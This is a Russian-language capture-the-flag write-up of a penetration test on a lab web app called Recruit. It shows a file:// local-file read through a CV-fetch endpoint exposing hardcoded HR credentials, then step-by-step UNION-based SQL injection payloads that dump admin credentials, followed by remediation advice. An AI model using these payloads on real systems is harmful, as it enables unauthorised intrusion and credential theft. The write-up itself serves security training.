# Отчёт о проникновении в систему Recruit

## Введение

В рамках задания проводилось тестирование на проникновение веб-приложения **Recruit** — портала для управления кандидатами, используемого HR-отделом и администраторами. По легенде, руководство подозревает, что при разработке платформы вопросам безопасности не уделили должного внимания. Цель — действовать как реальный атакующий: картировать структуру приложения, злоупотребить открытой функциональностью, эксплуатировать уязвимости и в итоге получить доступ под администратором.

В отчёте последовательно описаны все этапы: от первичного сканирования до получения учётных данных администратора.


## 1. Первичное сканирование

Сканирование целевого хоста выявило три открытых порта:

| Порт | Служба | Детали |
|------|--------|--------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 |
| 53 | DNS | ISC BIND 9.16.1 (Ubuntu Linux) |
| 80 | HTTP | Apache httpd 2.4.41 (Ubuntu) |

Ключевые наблюдения по HTTP:

- Заголовок `http-title: Recruit` — на главной странице форма авторизации.
- Cookie `PHPSESSID` установлена **без флага `HttpOnly`** — потенциальный вектор для кражи сессии через XSS.
- Разрешённые методы: `GET HEAD POST OPTIONS`.


## 2. Исследование веб-приложения

На главной странице расположена форма авторизации. Отдельно доступна страница `/api.php` с описанием:

> You can fetch a candidate CV using the following endpoint: `/file.php?cv=<URL>`
> Requests targeting restricted locations may be blocked by the API.
> The API supports fetching CVs from external URLs such as HTTP and HTTPS.

Попытка обращения напрямую к локальному файлу:

```
GET /file.php?cv=/etc/passwd HTTP/1.1
```

возвращает:

```
Only local files are allowed
```

Значит, фильтр блокирует часть путей, но не факт, что он надёжен.


## 3. Поиск способов обойти фильтры

Прогон `ffuf` со списком LFI-payload'ов не дал результатов — простые обходы не сработали. Это говорит о продуманном (но не абсолютном) фильтре.


## 4. Поиск скрытых директорий и файлов

Обращение к `/sitemap.xml` дало карту сайта:

```
<urlset>
  <!-- Public Pages -->
  <url><loc>http://recruit.thm/</loc></url>
  <url><loc>http://recruit.thm/index.php</loc></url>

  <!-- API & Documentation -->
  <url><loc>http://recruit.thm/api.php</loc></url>

  <!-- CV Retrieval Service -->
  <url><loc>http://recruit.thm/file.php</loc></url>

  <!-- Mails -->
  <url><loc>http://recruit.thm/mail/</loc></url>

  <!-- Authenticated Pages -->
  <url><loc>http://recruit.thm/dashboard.php</loc></url>
  <url><loc>http://recruit.thm/logout.php</loc></url>

  <!-- Static Assets -->
  <url><loc>http://recruit.thm/assets/</loc></url>

  <!--
    Notes:
    - Some directories may contain internal documentation or logs.
    - Certain endpoints are intended for internal HR integrations.
    - Access to sensitive data is role-restricted.
  -->
</urlset>
```

Комментарии в `sitemap.xml` прямо намекают на внутренние логи. Переход в `/mail/mail.log` раскрывает письмо от HR-команды:

```
May 14 09:32:11 recruit-server postfix/smtpd[2143]: connect from hr-workstation.local[10.10.5.23]
May 14 09:32:12 recruit-server postfix/smtpd[2143]: 4F1A2203F: client=hr-workstation.local[10.10.5.23]
May 14 09:32:13 recruit-server postfix/cleanup[2146]: 4F1A2203F: message-id=<20240514093213.4F1A2203F@recruit.local>
May 14 09:32:13 recruit-server postfix/qmgr[1789]: 4F1A2203F: from=<hr@recruit.thm>, size=1824, nrcpt=1 (queue active)
May 14 09:32:14 recruit-server postfix/local[2151]: 4F1A2203F: to=<it-support@recruit.local>, relay=local, delay=0.34, status=sent

------------------------------------------------------------
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>
Date: Tue, 14 May 2024 09:32:10 +0000
Subject: Recruitment Portal Deployment Confirmation

Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

We've completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.

Thanks,
HR Operations
Recruitment Team
------------------------------------------------------------
```

**Ключевые выводы:**

1. Существует пользователь `hr`, чьи учётные данные хранятся в `config.php`.
2. Учётные данные администратора **в файлах не хранятся** — только в базе данных.
3. Есть скрытая директория `/mail/` с логами.


## 5. Эксплуатация LFI через `file.php`

При попытке обращаться к внешним URL выяснилось, что запросы наружу не уходят — SSRF ограничен. Однако фильтр разрешает схему `file://`, что позволяет читать локальные файлы.

Чтение конфигурации:

```
file:///var/www/html/config.php
```

Возвращает исходник:

```php
$APP_NAME        = 'Recruit';
$APP_ENV         = 'production';
$APP_VERSION     = '1.2.4';
$APP_DEBUG       = false;

/*
|--------------------------------------------------------------------------
| HR Credentials (Temporary – Initial Rollout Phase)
|--------------------------------------------------------------------------
| NOTE:
| These credentials are stored here temporarily for ease of access
| during the initial deployment and will be moved to the database
| in a future release.
*/

$HR_PASSWORD = 'hrpassword123';

/*
|--------------------------------------------------------------------------
| API Configuration
|--------------------------------------------------------------------------
*/

$API_ENABLED     = true;
$API_VERSION     = 'v1';

?>
```

**Получены учётные данные HR:**

```
hr:hrpassword123
```


## 6. Авторизация под HR и эксплуатация SQL-инъекции

Авторизуемся под `hr:hrpassword123` и попадаем на `/dashboard.php?search=`.

### 6.1. Обнаружение SQL-инъекции

Попытка ввести `alice'` в поиск вызывает ошибку:

```
SQL Error:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

Это классическая SQL-инъекция в параметре `search`. Приложение подставляет ввод напрямую в SQL-запрос.

### 6.2. Определение числа столбцов

```
alice' ORDER BY 4 -- 
```

— ошибки нет.

```
alice' ORDER BY 5 -- 
```

— ошибка:

```
Unknown column '5' in 'order clause'
```

**Вывод:** в исходном запросе **4 столбца**. Тип СУБД — MySQL (по сообщению об ошибке).

### 6.3. Извлечение списка таблиц

```sql
alice' UNION SELECT null,null,null,table_name FROM information_schema.tables -- 
```

Получены все таблицы БД. Среди них — таблица `users`.

### 6.4. Извлечение списка столбцов таблицы `users`

```sql
alice' UNION SELECT null,null,null,column_name FROM information_schema.columns WHERE table_name='users' -- 
```

Возвращает:

```
MAX_SESSION_CONTROLLED_MEMORY
MAX_SESSION_TOTAL_MEMORY
TOTAL_CONNECTIONS
USER
id
password
username
```

Первые четыре — служебные столбцы `information_schema`, ниже — реальные столбцы таблицы `users`:

- `id`
- `username`
- `password`

### 6.5. Извлечение учётных данных администратора

```sql
alice' union select null,null,null,CONCAT(username,':',password) from users -- 
```

Возвращает:

```
admin:admin@001admin
```

**Получены учётные данные администратора.**


## Сводка уязвимостей

| № | Уязвимость | Где | Влияние |
|---|-----------|-----|---------|
| 1 | Cookie без `HttpOnly` | `PHPSESSID` | Риск кражи сессии |
| 2 | Открытый `sitemap.xml` с намёками | `/sitemap.xml` | Раскрытие структуры и подсказок |
| 3 | Логи почты в веб-доступе | `/mail/mail.log` | Утечка внутренней переписки с указанием на `config.php` |
| 4 | SSRF/LFI через `file.php` | `/file.php?cv=` | Чтение локальных файлов, включая `config.php` |
| 5 | Креды HR в исходном коде | `config.php` | Компрометация аккаунта HR |
| 6 | SQL-инъекция в поиске | `/dashboard.php?search=` | Дамп всей БД, включая `users` |
| 7 | Пароли в БД в открытом виде | `users.password` | Мгновенная компрометация admin |

## Рекомендации по устранению

1. **Установить флаг `HttpOnly`** (и `Secure` при HTTPS) на все сессионные cookie.
2. **Убрать `/mail/` из веб-доступа.** Логи и внутренние документы не должны быть доступны снаружи.
3. **Отключить схему `file://`** в `file.php`, если она не нужна. Если нужна — использовать строгий whitelist путей и `realpath()`-проверку, что файл лежит внутри разрешённой директории.
4. **Никогда не хранить учётные данные в исходном коде.** Использовать переменные окружения или секрет-менеджер. Убрать `$HR_PASSWORD` из `config.php`.
5. **Параметризовать SQL-запросы.** Заменить конкатенацию на `PreparedStatement`/`bindParam` с `?`.
6. **Хранить пароли только в виде хешей** (`password_hash()` + `password_verify()`), никогда — в открытом виде.
7. **Внедрить rate limiting и мониторинг** ошибок SQL, чтобы инъекции не оставались незамеченными.
8. **Сегментировать права БД.** Учётная запись приложения не должна иметь `SELECT` на `information_schema` без необходимости и не должна позволять чтение чужих таблиц.

## Заключение

Задание пройдено полностью: от открытой формы авторизации, через утечку в логах почты, к чтению `config.php` через `file://` в `file.php`, далее — вход под HR, эксплуатация SQL-инъекции в поиске, дамп таблицы `users` и вход под администратором. Все шаги выполнены в логике «как реальный атакующий»: разведка → анализ утечек → эксплуатация → эскалация. Цель достигнута — административный доступ получен.